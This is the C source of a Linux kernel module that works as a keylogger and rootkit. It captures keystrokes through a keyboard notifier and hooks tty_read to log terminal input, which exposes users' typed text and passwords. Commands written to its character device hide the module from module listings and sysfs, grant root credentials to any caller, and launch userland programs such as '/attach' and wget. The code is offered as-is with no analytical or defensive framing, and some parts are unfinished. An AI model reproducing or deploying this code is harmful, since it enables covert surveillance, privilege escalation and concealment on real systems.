#include <linux/cred.h>
#include <linux/slab.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/keyboard.h>
#include <linux/semaphore.h>
#include <linux/fs.h>
#include <asm/segment.h>
#include <asm/uaccess.h>
#include <linux/buffer_head.h>
#include <linux/string.h>
#include <linux/sysfs.h>
#include <linux/ftrace.h>
#include <linux/kallsyms.h>
#include <linux/linkage.h>
#include <linux/slab.h>
#include <linux/timer.h>


MODULE_LICENSE("GPL");
MODULE_AUTHOR("hyp");

static const char *keymap[][2] = {
{"\0", "\0"}, {"_ESC_", "_ESC_"}, {"1", "!"}, {"2", "@"},
{"3", "#"}, {"4", "$"}, {"5", "%"}, {"6", "^"}, {"7", "&"}, 
{"8", "*"}, {"9", "("}, {"0", ")"}, {"-", "_"}, {"=", "+"}, 
{"_BACKSPACE_", "_BACKSPACE_"}, {"_TAB_", "_TAB_"}, {"q", "Q"}, 
{"w", "W"}, {"e", "E"}, {"r", "R"},{"t", "T"}, {"y", "Y"}, {"u", "U"}, 
{"i", "I"}, {"o", "O"}, {"p", "P"}, {"[", "{"}, {"]", "}"}, 
{"_ENTER_", "_ENTER_"}, {"_CTRL_", "_CTRL_"}, {"a", "A"}, {"s", "S"},
{"d", "D"}, {"f", "F"}, {"g", "G"}, {"h", "H"}, {"j", "J"}, {"k", "K"}, 
{"l", "L"}, {";", ":"}, {"'", "\""}, {"`", "~"}, {"_SHIFT_", "_SHIFT_"}, 
{"\\", "|"}, {"z", "Z"}, {"x", "X"}, {"c", "C"}, {"v", "V"}, 
{"b", "B"}, {"n", "N"}, {"m", "M"}, {",", "<"}, {".", ">"}, 
{"/", "?"}, {"_SHIFT_", "_SHIFT_"}, {"_PRTSCR_", "_KPD*_"},
{"_ALT_", "_ALT_"}, {" ", " "}, {"_CAPS_", "_CAPS_"}, {"F1", "F1"},
{"F2", "F2"}, {"F3", "F3"}, {"F4", "F4"}, {"F5", "F5"},
{"F6", "F6"}, {"F7", "F7"}, {"F8", "F8"}, {"F9", "F9"}, 
{"F10", "F10"}, {"_NUM_", "_NUM_"}, {"_SCROLL_", "_SCROLL_"}, 
{"_KPD7_", "_HOME_"}, {"_KPD8_", "_UP_"}, {"_KPD9_", "_PGUP_"}, 
{"-", "-"}, {"_KPD4_", "_LEFT_"}, {"_KPD5_", "_KPD5_"}, 
{"_KPD6_", "_RIGHT_"}, {"+", "+"}, {"_KPD1_", "_END_"}, 
{"_KPD2_", "_DOWN_"}, {"_KPD3_", "_PGDN"}, {"_KPD0_", "_INS_"}, 
{"_KPD._", "_DEL_"}, {"_SYSRQ_", "_SYSRQ_"}, {"\0", "\0"}, 
{"\0", "\0"}, {"F11", "F11"}, {"F12", "F12"}, {"\0", "\0"}, 
{"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"},
{"\0", "\0"}, {"_ENTER_", "_ENTER_"}, {"_CTRL_", "_CTRL_"}, {"/", "/"},
{"_PRTSCR_", "_PRTSCR_"}, {"_ALT_", "_ALT_"}, {"\0", "\0"}, 
{"_HOME_", "_HOME_"}, {"_UP_", "_UP_"}, {"_PGUP_", "_PGUP_"}, 
{"_LEFT_", "_LEFT_"}, {"_RIGHT_", "_RIGHT_"}, {"_END_", "_END_"},
{"_DOWN_", "_DOWN_"}, {"_PGDN", "_PGDN"}, {"_INS_", "_INS_"}, 
{"_DEL_", "_DEL_"}, {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"}, 
{"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"}, 
{"_PAUSE_", "_PAUSE_"}, 
};

#define DEVICE_NAME "klog"
#define SUCCESS 0
#define USE_FENTRY_OFFSET 0


int keylog(struct notifier_block *, unsigned long, void *);
static int device_open(struct inode *, struct file *);
static int device_release(struct inode *, struct file *);
static ssize_t device_read(struct file *, char __user *, size_t, loff_t *);
static ssize_t device_write(struct file *, const char __user *, size_t, loff_t *);

static struct timer_list ftrace_timer;

static int major;
static int is_open = 0;
static int hidden = 0;
static int res;

static int shiftKey = 0;
struct semaphore sem;

static char keybuf[10000] = {};
static char *msg_ptr;

static struct file_operations fops = {
	.owner = THIS_MODULE,
	.read = device_read,
   	.write = device_write,
	.open = device_open,
	.release = device_release
};

static struct notifier_block nb = {
	.notifier_call = keylog
};

struct ftrace_hook {
	const char *name;
	void *function;
	void *original;

	unsigned long address;
	struct ftrace_ops ops;
};

static int ftrace_resolve(struct ftrace_hook *hook) {
	hook->address = kallsyms_lookup_name(hook->name);

	if(!hook->address) {
		pr_debug("unresolved symbol: %s\n", hook->name);
		return -ENOENT;
	}

#ifdef USE_FENTRY_OFFSET
	*((unsigned long*) hook->original) = hook->address + MCOUNT_INSN_SIZE;
#else
	*((unsigned long*) hook->original) = hook->address;
#endif

	return 0;
}

static void notrace ftrace_thunk(unsigned long ip, unsigned long parent_ip,
		struct ftrace_ops *ops, struct pt_regs *regs) {

	struct ftrace_hook *hook = container_of(ops, struct ftrace_hook, ops); 

	if(!within_module(parent_ip, THIS_MODULE))
		regs->ip = (unsigned long)hook->function;
}

int install_hook(struct ftrace_hook *hook) {
	int err;

	err = ftrace_resolve(hook);
	if(err)
		return err;

	hook->ops.func = ftrace_thunk;
	hook->ops.flags = FTRACE_OPS_FL_SAVE_REGS
		| FTRACE_OPS_FL_RECURSION_SAFE 
		| FTRACE_OPS_FL_IPMODIFY;

	err = ftrace_set_filter_ip(&hook->ops, hook->address, 0, 0);
	if(err) {
		pr_debug("ftrace_set_filter_ip() failed: %d\n", err);
		return err;
	}

	err = register_ftrace_function(&hook->ops);
	if (err) {
		pr_debug("register_ftrace_function() failed: %d\n", err);
		ftrace_set_filter_ip(&hook->ops, hook->address, 1, 0);
		return err;
	}

	return 0;
}

void remove_hook(struct ftrace_hook *hook) {
	int err;

	err = unregister_ftrace_function(&hook->ops);
	if(err) {
		pr_debug("unregister_ftrace_function() failed: %d\n", err);
	}

	err = ftrace_set_filter_ip(&hook->ops, hook->address, 1, 0);
	if(err) {
		pr_debug("ftrace_set_filter_ip() failed: %d\n", err);
	}
}

int install_hooks(struct ftrace_hook *hooks, size_t count) {
	int err;
	size_t i;

	for(i=0;i < count;i++) {
		err = install_hook(&hooks[i]);
		if(err)
			goto error;
	}

	return 0;

error:

	while (i != 0) {
		remove_hook(&hooks[--i]);
	}

	return err;
}

void remove_hooks(struct ftrace_hook *hooks, size_t count) {
	size_t i;

	for (i=0;i < count;i++)
		remove_hook(&hooks[i]);
}

static asmlinkage ssize_t (*real_tty_read)(struct file *file, char __user *buf, 
		size_t count, loff_t *ppos);

static asmlinkage ssize_t ftrace_tty_read(struct file *file, char __user *buf,
		size_t count, loff_t *ppos) {

	ssize_t ret;
	
	if(strlen(buf) > 0) {
		/*if((strlen(tty_keybuf)) > 9999) {
			pr_info("buf: %s\n", tty_keybuf);
			tty_keybuf[0] = '\0';
		}*/
		
		//strncat(tty_keybuf, buf, strlen(buf));
		pr_info("buf: %s\n", buf);
	}
	

	//pr_info("tty bufsize: %d\n", (int)strlen(buf));
	ret = real_tty_read(file, buf, count, ppos);

	return ret;
}


#define HOOK(_name, _function, _original)  \
	{									   \
		.name = (_name),                   \
		.function = (_function),           \
		.original = (_original),           \
	}

static struct ftrace_hook tty_hooks[] = {
	HOOK("tty_read", ftrace_tty_read, &real_tty_read)
};


static struct list_head *mlist;

static int inject_shell(void) {
	char *args[] = {"/attach", "1", NULL};

	static char *env[] = {
		"HOME=/",
		"TERM=linux",
		"PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL };

	return call_usermodehelper(args[0], args, env, UMH_WAIT_PROC);
}

static int find_wget(void) {
	char *args[] = {"/usr/bin/wget", "https://google.com", NULL};

	static char *env[] = {
		"HOME=/",
		"TERM=linux",
		"PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL };

	return call_usermodehelper(args[0], args, env, UMH_WAIT_PROC);
}

static int device_open(struct inode *inode, struct file *file) {

	if(is_open)
		return -EBUSY;

	msg_ptr = keybuf;
	is_open++;
	try_module_get(THIS_MODULE);

	printk(KERN_INFO "device opened");

	return SUCCESS;
}

static int device_release(struct inode *inode, struct file *file) {
	is_open--;
	module_put(THIS_MODULE);

	return 0;
}

static ssize_t device_read(struct file *filp, char __user *buff, size_t len, loff_t * off) {
	int bytes_read = 0;

	if(*msg_ptr == 0)
		return 0;

	while(len && *msg_ptr) {
		put_user(*(msg_ptr++), buff++);

		len--;
		bytes_read++;
	}

	return bytes_read;
}

static ssize_t
device_write(struct file *filp, const char __user *buff, size_t len, loff_t *off) {
	char *str = kmalloc(len, GFP_KERNEL);
	int error_count = copy_from_user(str, buff, len);
	
	printk(KERN_INFO "writered: %c\n", str[0]);
	
	if(strncmp("#offlager", str, 9) == 0) {
		if(hidden == 1)
			return -EINVAL;

		hidden = 1;
		mlist = THIS_MODULE->list.prev;
		//testhold = kobject_get(&THIS_MODULE->mkobj.kobj);
		
		list_del(&THIS_MODULE->list);
		kobject_del(&THIS_MODULE->mkobj.kobj);

		THIS_MODULE->sect_attrs = NULL;
		THIS_MODULE->notes_attrs = NULL;
	} else if(strncmp("#onlager", str, 8) == 0) {
		printk(KERN_INFO "log started?");
		if(hidden == 0)
			return -EINVAL;

		hidden = 0;
		kobject_put(&THIS_MODULE->mkobj.kobj);
		list_add(&THIS_MODULE->list, mlist);

		printk(KERN_INFO "kobject_put passed");
		res = kobject_add(&THIS_MODULE->mkobj.kobj, 
				THIS_MODULE->mkobj.kobj.parent, THIS_MODULE->name);
		
		res = kobject_add(THIS_MODULE->holders_dir, 
				THIS_MODULE->holders_dir->parent, "holders");

		//kobject_register(&THIS_MODULE->mkobj.kobj);

		//kobject_put(&THIS_MODULE->mkobj.kobj);
		//kfree(&THIS_MODULE->mkobj.kobj);

		//res = sysfs_create_dir_ns(&THIS_MODULE->mkobj.kobj, NULL);
	} else if(strncmp("#mkroot", str, 7) == 0) {
		struct cred *creds = prepare_creds();
		creds->uid.val = 0;
		creds->euid.val = 0;
		creds->gid.val = 0;
		creds->egid.val = 0;

		commit_creds(creds);
	} else if(strncmp("#inject", str, 7) == 0) {
		res = inject_shell();
		printk(KERN_INFO "injection status %d\n", res);
	} else if(strncmp("#wget", str, 5) == 0) {
		res = find_wget();
		printk(KERN_INFO "wget status %d\n", res);
	}	
	//return strlen(buff);
	kfree(str);
	return -EINVAL;
}



int keylog(struct notifier_block *nblock, unsigned long code, void *_param) {
    struct keyboard_notifier_param *param = _param;
    //struct file *fp = file_open("/testicle", O_WRONLY|O_CREAT, 0664);
    
    printk(KERN_INFO "Something");
	if(code == KBD_KEYCODE) {
		if(param->value==42 || param->value==54) {
	    	down(&sem);

	    	if(param->down)
				shiftKey = 1;
	    	else
				shiftKey = 0;

	    	up(&sem);
	    	return NOTIFY_OK;
		}

		if(param->down) {
	    	if(strlen(keybuf) > 9999) {
				printk(KERN_INFO "%s\n", keybuf); 
				keybuf[0] = '\0';
	    	}

	    	down(&sem);

	    	if(shiftKey == 0) {
				strncat(keybuf, keymap[param->value][0], 
		    		strlen(keymap[param->value][0]));
	    	} else {
				strncat(keybuf, keymap[param->value][1],
					strlen(keymap[param->value][0]));
	    	}

	    	up(&sem);
		}

    }

    return NOTIFY_OK;
}

static void kill_ftrace(unsigned long data) {
	remove_hooks(tty_hooks, ARRAY_SIZE(tty_hooks));
	return;
}

static int __init init_klog(void) {
	int err;

	keybuf[0] = '\0';
	hidden = 0;
	
    register_keyboard_notifier(&nb);
    printk(KERN_INFO "Registering keylager\n");
    sema_init(&sem, 1);

	major = register_chrdev(0, DEVICE_NAME, &fops);
	printk(KERN_INFO "major: %d\n", major);
	printk(KERN_INFO "module name: %s\n", THIS_MODULE->name);

    setup_timer(&ftrace_timer, kill_ftrace, 0);
	mod_timer(&ftrace_timer, jiffies + msecs_to_jiffies(60000));
	
	err = install_hooks(tty_hooks, ARRAY_SIZE(tty_hooks));
	if(err)
		return err;

	pr_info("hook installed");	
	
	return 0;
}

static void __exit cleanup_klog(void) {
    unregister_keyboard_notifier(&nb);
    unregister_chrdev(major, DEVICE_NAME);

	remove_hooks(tty_hooks, ARRAY_SIZE(tty_hooks));
    printk(KERN_INFO "Unregistered keylager\n");
}

module_init(init_klog);
module_exit(cleanup_klog);
	
